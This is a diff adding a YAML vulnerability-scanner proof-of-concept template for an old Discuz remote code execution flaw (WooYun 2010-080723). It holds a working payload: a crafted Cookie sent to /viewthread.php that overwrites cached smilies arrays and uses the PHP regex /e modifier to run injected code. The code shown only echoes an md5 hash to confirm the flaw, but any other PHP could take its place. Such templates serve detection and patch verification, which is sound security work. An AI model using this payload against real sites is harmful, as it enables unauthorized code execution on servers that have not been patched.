@@ -1,0 +1,23 @@
+id: poc-yaml-discuz-wooyun-2010-080723
+info:
+  name: Discuz Wooyun 2010 080723
+  severity: high
+  tags:
+  - 命令注入
+  finger: Discuz
+  reference: []
+  description: null
+variables:
+  rand: random_int(10000, 21000)
+transport: http
+requests:
+- method: GET
+  path: /viewthread.php?tid=10
+  headers:
+    Cookie: GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5({{.rand}}));
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, md5(rand))
+  output: []
